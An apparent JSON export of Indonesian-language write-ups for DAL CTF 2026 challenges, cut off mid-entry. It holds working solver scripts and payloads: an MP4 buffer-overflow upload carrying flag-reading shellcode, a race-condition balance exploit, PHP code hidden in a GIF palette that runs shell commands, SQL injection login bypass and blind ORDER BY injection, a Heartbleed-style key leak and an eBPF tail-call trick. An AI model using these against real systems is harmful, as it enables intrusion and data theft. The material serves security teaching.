        "code": "#!/usr/bin/env python3\r\nfrom pathlib import Path\r\nimport re\r\nimport struct\r\nimport sys\r\n\r\nimport requests\r\nimport urllib3\r\nfrom pwn import asm, context, p16, shellcraft\r\n\r\n\r\nURL = \"https://dalctf-video-killed-the-pwn-star-204-64616c.instancer.dalctf2026.com/upload\"\r\nTARGET_UUID = bytes(\r\n    [\r\n        0x44,\r\n        0x41,\r\n        0x4C,\r\n        0x43,\r\n        0x54,\r\n        0x46,\r\n        0x32,\r\n        0x30,\r\n        0x32,\r\n        0x36,\r\n        0x00,\r\n        0x01,\r\n        0x00,\r\n        0x00,\r\n        0x00,\r\n        0x00,\r\n    ]\r\n)\r\nOFFSET_RIP = 280\r\nOFFSET_BUF = 272\r\nCALL_RAX = 0x1014\r\nATTEMPTS = 200\r\n\r\n\r\ndef build_base_video() -> bytes:\r\n    base = Path(\"base6.mp4\")\r\n    if base.exists():\r\n        return base.read_bytes()\r\n    print(\"[*] base6.mp4 not found, generating a 6-second MP4 locally\")\r\n    import subprocess\r\n\r\n    subprocess.run(\r\n        [\r\n            \"ffmpeg\",\r\n            \"-y\",\r\n            \"-f\",\r\n            \"lavfi\",\r\n            \"-i\",\r\n            \"color=c=black:s=16x16:d=6\",\r\n            \"-c:v\",\r\n            \"libx264\",\r\n            \"-t\",\r\n            \"6\",\r\n            \"base6.mp4\",\r\n        ],\r\n        check=True,\r\n        stdout=subprocess.DEVNULL,\r\n        stderr=subprocess.DEVNULL,\r\n    )\r\n    return base.read_bytes()\r\n\r\n\r\ndef build_shellcode() -> bytes:\r\n    context.arch = \"amd64\"\r\n    return asm(\"endbr64\\n\" + shellcraft.cat(\"/flag.txt\") + shellcraft.exit(0))\r\n\r\n\r\ndef build_mp4(base: bytes, shellcode: bytes, low16: int) -> bytes:\r\n    payload = shellcode.ljust(OFFSET_BUF, b\"\\x90\") + (b\"B\" * 8) + p16(low16)\r\n    assert len(payload) == OFFSET_RIP + 2\r\n    box = struct.pack(\">I4s\", 24 + len(payload), b\"uuid\") + TARGET_UUID + payload\r\n    return base + box\r\n\r\n\r\ndef extract_flag(text: str) -> str | None:\r\n    pre = re.search(r\"<pre>(.*?)</pre>\", text, re.S)\r\n    body = pre.group(1) if pre else text\r\n    match = re.search(r\"([A-Za-z0-9_]+\\{[^<>\\n]+\\})\", body)\r\n    if match:\r\n        return match.group(1)\r\n    return None\r\n\r\n\r\ndef main() -> int:\r\n    urllib3.disable_warnings()\r\n    base = build_base_video()\r\n    shellcode = build_shellcode()\r\n    lows = [((n << 12) + CALL_RAX) & 0xFFFF for n in range(16)]\r\n    session = requests.Session()\r\n\r\n    print(f\"[*] shellcode length: {len(shellcode)} bytes\")\r\n    print(f\"[*] brute-forcing low 16 bits across up to {ATTEMPTS} uploads\")\r\n\r\n    for attempt in range(1, ATTEMPTS + 1):\r\n        low16 = lows[(attempt - 1) % len(lows)]\r\n        mp4 = build_mp4(base, shellcode, low16)\r\n        files = {\"video\": (\"exploit.mp4\", mp4, \"video/mp4\")}\r\n\r\n        try:\r\n            response = session.post(URL, files=files, timeout=15, verify=False)\r\n        except Exception as exc:\r\n            print(f\"[!] attempt {attempt:03d} failed: {exc}\")\r\n            continue\r\n\r\n        flag = extract_flag(response.text)\r\n        print(f\"[*] attempt {attempt:03d} low16={low16:#06x} status={response.status_code}\")\r\n        if flag:\r\n            print(flag)\r\n            return 0\r\n\r\n    print(\"[!] flag not found; try running again\")\r\n    return 1\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    sys.exit(main())"
      }
    ],
    "terminalOutputs": [],
    "flag": "dalctf{s0rry_f0r_th3_d3c3pt10n}",
    "lessonsLearned": []
  },
  {
    "id": "dalctf2026-rev-babyandorid",
    "title": "Baby Android",
    "ctfName": "DAL CTF 2026",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "tags": [],
    "description": "Challenge ini ternyata sangat lurus setelah APK di-unpack dengan `apktool`.",
    "problemDescription": "Challenge ini ternyata sangat lurus setelah APK di-unpack dengan `apktool`.",
    "tools": [],
    "analysis": "1. Saya decompile APK:\n\n   ```bash\n   apktool d -f chall.apk -o apkout\n   ```\n\n2. Lalu saya cari string mencurigakan. Dari situ langsung kelihatan ada tiga fragment bernama `flag1`, `flag2`, dan `flag3`.",
    "solution": [
      {
        "title": "Temuan Utama",
        "content": "- `flag1` ada di constructor `MainActivity`.\n  - File: [`apkout/smali_classes4/com/example/babyandroid/MainActivity.smali`](/home/nata/ctf/dalctf2026/rev/babyAndorid/apkout/smali_classes4/com/example/babyandroid/MainActivity.smali#L53)\n  - Nilainya: `dalctf{4ndr0id`\n\n- `flag2` ada di resource string dan juga dipakai sebagai `android:description` di manifest.\n  - File: [`apkout/res/values/strings.xml`](/home/nata/ctf/dalctf2026/rev/babyAndorid/apkout/res/values/strings.xml#L66)\n  - Nilainya: `_d3bugg1ng_`\n  - Manifest: [`apkout/AndroidManifest.xml`](/home/nata/ctf/dalctf2026/rev/babyAndorid/apkout/AndroidManifest.xml#L5)\n\n- `flag3` ada di `ui/theme/ColorKt`.\n  - File: [`apkout/smali_classes3/com/example/babyandroid/ui/theme/ColorKt.smali`](/home/nata/ctf/dalctf2026/rev/babyAndorid/apkout/smali_classes3/com/example/babyandroid/ui/theme/ColorKt.smali#L117)\n  - Nilainya: `_1s_e4sy}`"
      },
      {
        "title": "Kesimpulan",
        "content": "Kalau ketiga potongan itu digabung persis seperti di kode, hasilnya:\n\n`dalctf{4ndr0id_d3bugg1ng__1s_e4sy}`"
      },
      {
        "title": "Catatan",
        "content": "UI aplikasi cuma berisi teks pengalih seperti:\n\n- `nothing to see here`\n- `Move along, folks.`\n- `have you checked under the hood?`\n\nJadi inti challenge memang ada di pembacaan string statis, bukan di interaksi aplikasi."
      },
      {
        "title": "Solver Script",
        "content": "Script solver lengkap (solve.py):",
        "code": "#!/usr/bin/env python3\r\nfrom pathlib import Path\r\nimport re\r\n\r\n\r\nBASE = Path(__file__).resolve().parent / \"apkout\"\r\n\r\n\r\ndef read_text(path: Path) -> str:\r\n    return path.read_text(encoding=\"utf-8\", errors=\"ignore\")\r\n\r\n\r\ndef extract(pattern: str, text: str, label: str) -> str:\r\n    match = re.search(pattern, text)\r\n    if not match:\r\n        raise SystemExit(f\"missing {label}\")\r\n    return match.group(1)\r\n\r\n\r\ndef main() -> None:\r\n    flag1 = extract(\r\n        r'const-string v0, \"([^\"]+)\"',\r\n        read_text(BASE / \"smali_classes4/com/example/babyandroid/MainActivity.smali\"),\r\n        \"flag1\",\r\n    )\r\n    flag2 = extract(\r\n        r'<string name=\"flag2\">(.*?)</string>',\r\n        read_text(BASE / \"res/values/strings.xml\"),\r\n        \"flag2\",\r\n    )\r\n    flag3 = extract(\r\n        r'const-string v0, \"([^\"]+)\"',\r\n        read_text(BASE / \"smali_classes3/com/example/babyandroid/ui/theme/ColorKt.smali\"),\r\n        \"flag3\",\r\n    )\r\n    print(flag1 + flag2 + flag3)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "dalctf{4ndr0id_d3bugg1ng__1s_e4sy}",
    "lessonsLearned": []
  },
  {
    "id": "dalctf2026-rev-bitminer",
    "title": "Bit Miner",
    "ctfName": "DAL CTF 2026",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "tags": [],
    "description": "Target: `tcp://instancer.dalctf2026.com:23270`",
    "problemDescription": "Target: `tcp://instancer.dalctf2026.com:23270`",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Inti Masalah",
        "content": "Bug utamanya ada di `buy()`:\n\n\n\nSaldo dicek dulu memakai nilai `bits` yang diterima dari `shop()`, lalu akun di-load ulang dari storage sebelum dikurangi.\n\nArtinya ada race / TOCTOU:\n\n1. Session A membuka shop saat saldo cukup.\n2. Session A berhenti di prompt konfirmasi.\n3. Session B menghabiskan saldo yang sama sampai di bawah harga item.\n4. Session A tetap lolos cek karena masih pakai snapshot saldo lama.\n5. Saat `account.bits -= price` dijalankan, nilai aktual sudah lebih kecil dari `price`.\n6. Karena `bits` bertipe `unsigned long`, subtraction underflow dan berubah jadi nilai sangat besar.\n\nBegitu saldo meledak, flag bisa dibeli langsung.",
        "code": "if (price > bits) {\n    printf(\"You don't have enough money for this item\\n\");\n    return;\n}\n\n...\n\nAccount account = storage_get_account(username);\n...\naccount.bits -= price;\nstorage_save_account(username, account);"
      },
      {
        "title": "Kenapa Bisa Jalan",
        "content": "Harga termurah di shop adalah 10 bits. Jadi cukup bawa saldo ke kisaran 10 sampai 19 bits dulu. Dari state itu:\n\n- Session A buka shop dan pilih item murah.\n- Session B beli item murah yang sama.\n- Session A konfirmasi.\n\nJika saldo aktual sudah turun di bawah 10 saat Session A mengeksekusi pembelian, hasil subtraction wrap ke angka maksimum `unsigned long`."
      },
      {
        "title": "Langkah Exploit",
        "content": "1. Buat akun baru.\n2. Mine sampai saldo minimal 10 bits.\n3. Buka shop di session A, pilih upgrade termurah, lalu tahan di prompt konfirmasi.\n4. Buka session B dengan akun yang sama.\n5. Beli upgrade termurah sekali supaya saldo turun di bawah 10.\n6. Kembali ke session A dan konfirmasi.\n7. Saldo wrap jadi besar.\n8. Beli flag di shop."
      },
      {
        "title": "Hasil",
        "content": "Flag yang didapat:\n\n`dalctf{b1t_w4rp1ng_5ucc3s5ful}`"
      },
      {
        "title": "File",
        "content": "- `solve.py`: exploit otomatis end-to-end\n- `README.md`: writeup ini"
      },
      {
        "title": "Solver Script",
        "content": "Script solver lengkap (solve.py):",
        "code": "#!/usr/bin/env python3\r\nfrom pwn import *\r\nimport re\r\nimport time\r\n\r\nHOST = \"instancer.dalctf2026.com\"\r\nPORT = 23270\r\n\r\ncontext.log_level = \"error\"\r\n\r\n\r\ndef start_session(username: bytes, password: bytes):\r\n    r = remote(HOST, PORT)\r\n    r.recvuntil(b\"Username: \")\r\n    r.sendline(username)\r\n    r.recvuntil(b\"Password: \")\r\n    r.sendline(password)\r\n    r.recvuntil(b\"Option: \")\r\n    return r\r\n\r\n\r\ndef mine_until_ten(r):\r\n    bits = 0\r\n    while bits < 10:\r\n        r.sendline(b\"1\")\r\n        out = r.recvuntil(b\"Option: \")\r\n        if b\"Bonus! +2 bits\" in out:\r\n            bits += 2\r\n        elif b\"+1 bit\" in out:\r\n            bits += 1\r\n        else:\r\n            raise RuntimeError(f\"unexpected mine output: {out!r}\")\r\n    return bits\r\n\r\n\r\ndef buy_item_and_wait_confirm(r, item: bytes):\r\n    r.sendline(b\"2\")\r\n    r.recvuntil(b\"Option: \")\r\n    r.sendline(item)\r\n    r.recvuntil(b\"Confirm purchase (y / n): \")\r\n\r\n\r\ndef finish_buy(r):\r\n    r.sendline(b\"y\")\r\n    return r.recvuntil(b\"Option: \")\r\n\r\n\r\ndef main():\r\n    tag = str(int(time.time()))\r\n    username = f\"u{tag}\".encode()\r\n    password = f\"p{tag}\".encode()\r\n\r\n    r = start_session(username, password)\r\n    bits = mine_until_ten(r)\r\n\r\n    # Session A enters the shop with a stale balance snapshot.\r\n    buy_item_and_wait_confirm(r, b\"1\")\r\n\r\n    # Session B spends 10 bits first, making the real balance smaller than\r\n    # the stale balance held by session A.\r\n    r2 = start_session(username, password)\r\n    buy_item_and_wait_confirm(r2, b\"1\")\r\n    out_b = finish_buy(r2)\r\n    r2.sendline(b\"3\")\r\n    r2.recvall(timeout=1)\r\n    r2.close()\r\n\r\n    # Session A confirms the purchase using the stale check. The subtraction\r\n    # is done on the freshly loaded account, so this wraps the unsigned balance.\r\n    out_a = finish_buy(r)\r\n\r\n    # Now the wrapped balance is enough to buy the flag.\r\n    r.sendline(b\"2\")\r\n    r.recvuntil(b\"Option: \")\r\n    r.sendline(b\"4\")\r\n    r.recvuntil(b\"Confirm purchase (y / n): \")\r\n    r.sendline(b\"y\")\r\n    data = r.recvuntil(b\"Option: \")\r\n\r\n    m = re.search(rb\"Flag: ([^\\r\\n]+)\", data)\r\n    if not m:\r\n        raise RuntimeError(f\"flag not found in output: {data!r}\")\r\n\r\n    flag = m.group(1).decode()\r\n    print(flag)\r\n\r\n    r.sendline(b\"3\")\r\n    r.recvall(timeout=1)\r\n    r.close()\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "dalctf{b1t_w4rp1ng_5ucc3s5ful}",
    "lessonsLearned": []
  },
  {
    "id": "dalctf2026-rev-haskel",
    "title": "Haskell2",
    "ctfName": "DAL CTF 2026",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "tags": [],
    "description": "Challenge ini kelihatan seperti compiler Haskell kecil, tapi ternyata bahasa yang dipakai jauh lebih sederhana.",
    "problemDescription": "Challenge ini kelihatan seperti compiler Haskell kecil, tapi ternyata bahasa yang dipakai jauh lebih sederhana.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Langkah awal",
        "content": "Saya mulai dari enumerasi lokal pada binary `haskel`:\n\n- `file` menunjukkan ini ELF 64-bit PIE yang stripped.\n- `strings` langsung ngasih petunjuk keyword bahasa:\n  - `remember that`\n  - `innocuous`\n  - `read file`\n  - `for each`\n  - `tell me`\n- Dari `r2`, terlihat compiler ini bukan interpreter murni. Dia generate C, lalu compile lagi pakai `cc`."
      },
      {
        "title": "Grammar yang ketemu",
        "content": "Setelah beberapa percobaan, format bahasa sumbernya kebaca:\n\n- assignment biasa:\n\n\n\n- output:\n\n\n\n- binding file:\n\n\n\n- baca isi file per baris:\n\n\n\nKalau file hasil `read file` dipakai langsung tanpa `for each`, compiler ngasih semantic error:\n\n- `file values must be consumed by a line iterator`",
        "code": "remember that x is 1"
      },
      {
        "title": "Validasi lokal",
        "content": "Saya cek dulu di lokal dengan file contoh seperti `/etc/hostname`.\n\nProgram ini berhasil dan generate executable yang mem-print isi file baris demi baris:",
        "code": "innocuous x <- read file \"/etc/hostname\"\nfor each line in x tell me line"
      },
      {
        "title": "Payload final",
        "content": "Program ini dikirim ke service sebagai base64, lalu checker menjalankan hasil compile-nya dan mengeluarkan flag.",
        "code": "innocuous f <- read file \"flag.txt\"\nfor each line in f tell me line"
      },
      {
        "title": "Solver Script",
        "content": "Script solver lengkap (solve.py):",
        "code": "#!/usr/bin/env python3\r\n\r\nimport base64\r\n\r\nfrom pwn import remote\r\n\r\n\r\nHOST = \"instancer.dalctf2026.com\"\r\nPORT = 60923\r\n\r\nPROGRAM = b'innocuous f <- read file \"flag.txt\"\\nfor each line in f tell me line\\n'\r\n\r\n\r\ndef main() -> None:\r\n    io = remote(HOST, PORT)\r\n    io.recvuntil(b\"Send base64-encoded haskell2 program:\")\r\n    io.sendline(base64.b64encode(PROGRAM))\r\n    data = io.recvall(timeout=5)\r\n    print(data.decode(errors=\"replace\"), end=\"\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "Di remote service, `\"/flag\"` gagal dibaca. Saya lanjut brute force path yang umum:\n\n- `/flag`\n- `/app/flag`\n- `/home/challenge/flag`\n- `/home/challenge/flag.txt`\n- dan variasi lain\n\nLalu saya pakai `/etc/passwd` untuk lihat user yang ada di container. Di sana ada user `challenge` dengan home `/home/challenge`.\n\nSetelah brute lebih luas, path yang benar ternyata:\n\n```text\nflag.txt\n```\n\nJadi payload final cukup baca file itu dan print per baris.",
    "lessonsLearned": []
  },
  {
    "id": "dalctf2026-web-catgits",
    "title": "Cat GIFs",
    "ctfName": "DAL CTF 2026",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "tags": [],
    "description": "Challenge ini kelihatan seperti upload gambar biasa, tapi ternyata jalur serangnya ada di proses re-encode GIF yang dilakukan server.",
    "problemDescription": "1. Halaman utama hanya berisi form upload GIF.\n2. Saat upload GIF yang invalid, server menampilkan error dari `imagegif()`.\n3. Itu berarti file upload dibuka pakai GD, lalu ditulis ulang sebagai GIF.\n4. Karena file hasil upload disimpan dengan ekstensi sesuai nama asli, kita bisa unggah file `.php`.\n5. Kalau isi file hasil re-encode bisa dibuat mengandung PHP tag, file itu akan dieksekusi saat dibuka.",
    "tools": [],
    "analysis": "Halaman utama hanya punya form upload dan gallery.\n\nRespon upload gagal memberi error seperti:\n\n```text\nimagegif(): Argument #1 ($image) must be of type GdImage, bool given\n```\n\nItu petunjuk penting:\n\n- `imagecreatefromgif()` dipakai untuk membaca file upload.\n- `imagegif()` dipakai untuk menulis ulang file.\n- Jadi server bukan sekadar `move_uploaded_file()`.\n\nSaya juga cek file yang ada di target:\n\n- `/includes/upload.php` ada, tapi kosong.\n- Directory listing untuk `/includes/` dan `/uploads/` diblok.\n- Tidak ada endpoint source disclosure yang langsung kelihatan.",
    "solution": [
      {
        "title": "Temuan Kunci: Isi Palette GIF Masih Bisa Dipakai",
        "content": "Saya bikin GIF paletted lokal dan upload ke server.\n\nYang menarik, bytes palette pada GIF hasil upload masih bisa dikendalikan cukup presisi.\n\nContoh paling kecil:\n\n\n\nKalau string itu dimasukkan ke palette GIF dan file diupload sebagai `echo.php`, response dari `/uploads/echo.php` berubah jadi output PHP, bukan file GIF mentah.\n\nItu membuktikan:\n\n- file `.php` hasil upload memang dieksekusi oleh Apache/PHP,\n- dan payload bisa disisipkan lewat palette GIF.",
        "code": "<?=1?>"
      },
      {
        "title": "Payload Generator",
        "content": "Saya pakai `Pillow` untuk bikin GIF paletted.\n\nStruktur idenya:\n\n- isi bytes palette dengan payload PHP,\n- pastikan jumlah warna cocok,\n- lalu upload file hasilnya dengan nama `.php`.\n\nContoh generator:\n\n\n\nPayload ini cukup stabil untuk 4 warna.\n\nUntuk baca flag, payload yang dipakai:\n\n\n\nKenapa ini bekerja:\n\n- `<?= ... ?>` adalah short echo PHP.\n- Backtick menjalankan shell command.\n- `cat /f*` cocok untuk kasus flag yang diletakkan di `/flag` atau `/flag.txt`.",
        "code": "from PIL import Image\n\npayload = b'<?=`id   `?>'\nimg = Image.new('P', (4, 1))\npalette = list(payload) + [0, 0, 0] * (256 - 4)\nimg.putpalette(palette)\nimg.putdata([0, 1, 2, 3])\nimg.save('id4.gif', format='GIF')"
      },
      {
        "title": "Validasi",
        "content": "Saya validasi dulu dengan `id`:\n\n\n\nResponse yang keluar berisi:\n\n\n\nSetelah itu saya ganti payload jadi `cat /f*` dan upload sebagai `cat5.php`.\n\nHasilnya keluar flag:",
        "code": "<?=`id   `?>"
      },
      {
        "title": "Kesimpulan",
        "content": "Root cause challenge ini:\n\n- server melakukan re-encode GIF dengan GD,\n- tapi output GIF masih bisa dipengaruhi lewat palette bytes,\n- lalu file upload disimpan dengan ekstensi user-supplied,\n- jadi kita bisa menanam PHP payload di file `.php` yang valid sebagai GIF.\n\nKalau mau pendek:\n\n1. Upload GIF paletted yang bytes palette-nya berisi PHP.\n2. Simpan sebagai `.php`.\n3. Buka file hasil upload.\n4. Jalankan command untuk baca flag."
      }
    ],
    "terminalOutputs": [],
    "flag": "dalctf{m30w_m3333333000w}",
    "lessonsLearned": []
  },
  {
    "id": "dalctf2026-web-heartpart7",
    "title": "Heart Part 7 — DAL CTF 2026",
    "ctfName": "DAL CTF 2026",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "tags": [],
    "description": "**Category:** Web  \n**Flag:** `dalctf{p1mp_p1mp_h00r4y}`",
    "problemDescription": "**Category:** Web  \n**Flag:** `dalctf{p1mp_p1mp_h00r4y}`\n\n> *\"what happens on earth stays on earth\"*  \n> spoiler: the key didn't stay on earth\n\n---",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Overview",
        "content": "Web app Flask sederhana — Kung Fu Kenny's Dojo. Ada tiga route publik: `/`, `/search`, `/login`. Tantangannya minta kita nemuin flag yang di-enkripsi AES-256-CBC dan di-decrypt-nya.\n\nExploit chain-nya:\n1. SQL injection di login → bypass auth\n2. Akses `/admin` dengan JWT session\n3. Heartbleed-style memory leak di `/cipher/health` → bocorkan AES key\n4. Decrypt flag\n\n---"
      },
      {
        "title": "Recon",
        "content": "Flask app. Route penting:\n- `/search` — GET param `q`, query database teknik kung fu\n- `/login` — POST form username/password\n- `/admin` — butuh auth\n\n---",
        "code": "curl -I https://[instance].instancer.dalctf2026.com"
      },
      {
        "title": "Step 1: SQL Injection di Login",
        "content": "Login form biasa, tidak ada petunjuk apapun. Coba SQLi klasik:\n\n\n\nResponse:\n\n\n\nLangsung bypass. JWT payload-nya kalau di-decode:\n\n\n\nServer generate JWT tanpa verify — cukup inject SQL biar query return true, server langsung kasih token admin.\n\n---",
        "code": "curl -si -X POST https://[instance].instancer.dalctf2026.com/login \\\n  -d \"username=admin' OR '1'='1'--&password=x\""
      },
      {
        "title": "Step 2: Eksplorasi /admin",
        "content": "Ada tiga hal menarik di halaman ini:\n\n1. **`/api/flag`** — return encrypted flag\n2. **`/cipher/health`** — cipher service health check\n3. **`/api/techniques`** — CRUD teknik kung fu (tidak relevan)\n\nAmbil encrypted flag dulu:\n\n\n\n\n\nFlag sudah ada, tinggal butuh key-nya.\n\n---",
        "code": "curl -s https://[instance].instancer.dalctf2026.com/admin \\\n  -H \"Cookie: session=[jwt]\""
      },
      {
        "title": "Step 3: Heartbleed-style Memory Leak",
        "content": "Endpoint `/cipher/health` menerima JSON dengan field `data` dan `size`:\n\n\n\n\n\nField `echo` itu base64 dari input kita — `UElORw==` = `PING`. Normal.\n\nTapi `size` mencurigakan. Coba naikin nilainya:\n\n\n\nOutput:\n\n\n\nServer allocate buffer sebesar `size`, copy input ke dalamnya, lalu return seluruh buffer — termasuk data yang ada di memory sebelumnya. Persis Heartbleed (CVE-2014-0160), tapi versi Python/Flask.\n\nDump hex penuh:\n\n\n\nDecode base64 response-nya, parse hex:\n\n\n\n`4b454e445249434b5f4d41535445525f4b45593d` = `KENDRICK_MASTER_KEY=`\n\n32 bytes setelahnya adalah AES-256 key:\n\n\n\n---",
        "code": "curl -s -X POST https://[instance].instancer.dalctf2026.com/cipher/health \\\n  -H \"Cookie: session=[jwt]\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"data\": \"PING\", \"size\": 4}'"
      }
    ],
    "terminalOutputs": [],
    "flag": "dalctf{p1mp_p1mp_h00r4y}",
    "lessonsLearned": []
  },
  {
    "id": "dalctf2026-web-secureformadmin",
    "title": "SecureForm Admin",
    "ctfName": "DAL CTF 2026",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "tags": [],
    "description": "Writeup for challenge SecureForm Admin",
    "problemDescription": "Challenge ini kelihatan sederhana di awal: ada form login dengan PIN 4 digit. Setelah masuk ke dashboard, ternyata titik lemah utamanya ada di fitur sorting daftar entry. `orderby` terlihat dibatasi, tapi `order` masih dipakai mentah di query SQL dan bisa dijadikan oracle blind SQLi.\n\nFlag yang didapat:\n\n`dalctf{bl1nd_sqli_0rd3r_by}`",
    "tools": [],
    "analysis": "Halaman awal cuma menampilkan form PIN 4 digit. Tidak ada petunjuk tambahan di HTML atau CSS, jadi saya uji respons login langsung dari server.\n\nRespons untuk PIN salah selalu konsisten, jadi brute force 0000-9999 adalah jalan paling cepat. Dari sana ketemu PIN yang benar:\n\n- `7392`",
    "solution": [
      {
        "title": "2. Masuk ke dashboard",
        "content": "Setelah login, aplikasi pindah ke `dashboard.php`. Di sana ada:\n\n- form `add_entry`\n- tombol `clear_all`\n- opsi sorting lewat parameter query `orderby` dan `order`\n\nSaya tambahkan dua entry dengan `name` yang sama supaya efek sorting bisa diamati dengan jelas."
      },
      {
        "title": "3. Temukan celah di `order`",
        "content": "`orderby` memang terlihat dibatasi, tapi `order` ternyata disisipkan langsung ke query `ORDER BY`.\n\nPayload sederhana ini sudah cukup buat membuktikan ada injeksi:\n\n\n\nKarena dua entry punya `name` yang sama, hasil sort bisa dipakai sebagai boolean oracle:\n\n- kalau kondisi `true`, urutan jadi `id ASC`\n- kalau kondisi `false`, urutan jadi `id DESC`\n\nDengan cara ini, saya bisa cek ekspresi SQL apa pun secara blind.",
        "code": "order=ASC, CASE WHEN 1=1 THEN id ELSE -id END"
      },
      {
        "title": "4. Identifikasi database",
        "content": "Pakai oracle tadi untuk baca metadata. Hasilnya:\n\n- database: `ctf_challenge`\n- tabel: `entries,secrets`\n\nLalu saya dump struktur tabel `secrets`:\n\n- kolom: `id,flag`\n- jumlah row: `1`"
      },
      {
        "title": "Inti bug",
        "content": "Masalah utamanya ada di sanitasi sorting. Developer mencoba membatasi parameter sorting, tapi `order` masih bisa membawa ekspresi SQL tambahan. Karena sorting dipakai pada query `ORDER BY`, saya bisa bikin oracle blind SQLi tanpa perlu error message eksplisit atau UNION.\n\nKalau diringkas:\n\n- PIN 4 digit bisa dibobol brute force\n- dashboard punya blind SQLi di sorting\n- flag ada di tabel `secrets`"
      }
    ],
    "terminalOutputs": [],
    "flag": "dalctf{bl1nd_sqli_0rd3r_by}",
    "lessonsLearned": []
  },
  {
    "id": "dalctf2026-misc-lostmyprinterflag",
    "title": "Lost My Flag Printer",
    "ctfName": "DAL CTF 2026",
    "category": "Misc",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "tags": [],
    "description": "Challenge ini kelihatannya simpel karena kita disuruh login sebagai user `ebpf` dengan password kosong, tapi setelah dibuka ternyata poin utamanya bukan di login shell, melainkan di object eBPF yang dibuat oleh binary setuid `/chal`..",
    "problemDescription": "Binary `/chal` berjalan sebagai root, lalu membuat tiga object eBPF yang di-pin ke bpffs:\n\n- `/sys/fs/bpf/flag`\n- `/sys/fs/bpf/prog`\n- `/sys/fs/bpf/prog_map`\n\nSetelah itu program menampilkan pesan:\n\n`Dang, I left my flag printer in /sys/fs/bpf/prog_map.`\n\nKalimat itu sebenarnya spoiler. Flag printer-nya memang disimpan sebagai program eBPF, tapi tidak langsung dijalankan. Program root tersebut hanya:\n\n1. Membuat map `flag`\n2. Me-load sebuah program eBPF\n3. Menaruh FD program itu ke `prog_map`\n\nAkibatnya `/sys/fs/bpf/flag` tetap kosong sampai ada yang men-trigger program tersebut.",
    "tools": [],
    "analysis": "Dari reversing `chal`, alurnya seperti ini:\n\n1. `BPF_MAP_CREATE` untuk `flag`\n2. `BPF_OBJ_PIN` ke `/sys/fs/bpf/flag`\n3. `BPF_PROG_LOAD` untuk sebuah program `SOCKET_FILTER`\n4. `BPF_OBJ_PIN` ke `/sys/fs/bpf/prog`\n5. `BPF_MAP_CREATE` lagi untuk `prog_map`\n6. `BPF_OBJ_PIN` ke `/sys/fs/bpf/prog_map`\n7. `BPF_MAP_UPDATE_ELEM(prog_map, key=0, value=prog_fd)`\n\nProgram BPF yang di-load root berisi literal potongan flag, lalu saat dieksekusi dia menulis flag itu ke map `flag`.\n\nMasalahnya: root tidak pernah menjalankan program itu.",
    "solution": [
      {
        "title": "Titik lemah",
        "content": "Karena `prog_map` dipin dan dapat dibuka oleh user `ebpf`, kita bisa:\n\n1. Membuka pinned map `/sys/fs/bpf/prog_map`\n2. Me-load program BPF kecil milik kita sendiri sebagai `SOCKET_FILTER`\n3. Dari program kecil itu, memanggil helper `bpf_tail_call(ctx, prog_map, 0)`\n\nKalau key `0` berisi FD program milik root, tail call akan lompat ke sana dan program root tersebut berjalan dalam konteks eksekusi paket yang kita trigger.\n\nBegitu program root itu jalan, flag ditulis ke map `/sys/fs/bpf/flag`.\n\nTerakhir tinggal baca isi map tersebut dari userland."
      },
      {
        "title": "Bentuk exploit",
        "content": "Saya buat helper ELF kecil `exploit_min` yang:\n\n1. `BPF_OBJ_GET(\"/sys/fs/bpf/prog_map\")`\n2. `BPF_OBJ_GET(\"/sys/fs/bpf/flag\")`\n3. `BPF_PROG_LOAD()` untuk program BPF minimal yang hanya:\n   - copy `ctx` ke `r6`\n   - set `r3 = 0`\n   - load `prog_map` sebagai pseudo map fd ke `r2`\n   - call `bpf_tail_call`\n   - return\n4. Attach program itu ke UNIX datagram socket dengan `SO_ATTACH_BPF`\n5. Kirim 1 byte ke socket untuk men-trigger program\n6. `BPF_MAP_LOOKUP_ELEM(flag, key=0)`\n\nHasil lookup itulah flag."
      },
      {
        "title": "Kenapa upload helper, bukan langsung dari shell?",
        "content": "Environment target sangat minimal. Tidak ada compiler, tidak ada bpftool, dan shell serial raw cukup rewel untuk payload panjang. Jadi cara paling stabil adalah:\n\n1. Encode helper binary ke base64\n2. Upload bertahap per chunk\n3. Decode jadi `/tmp/ex`\n4. Jalankan `/chal`\n5. Jalankan helper\n\nItu yang dilakukan `solve.py`."
      },
      {
        "title": "Menjalankan solve",
        "content": "Atau untuk instance lain:\n\n\n\nScript akan print flag langsung.",
        "code": "python3 solve.py --port 23076"
      },
      {
        "title": "Solver Script",
        "content": "Script solver lengkap (solve.py):",
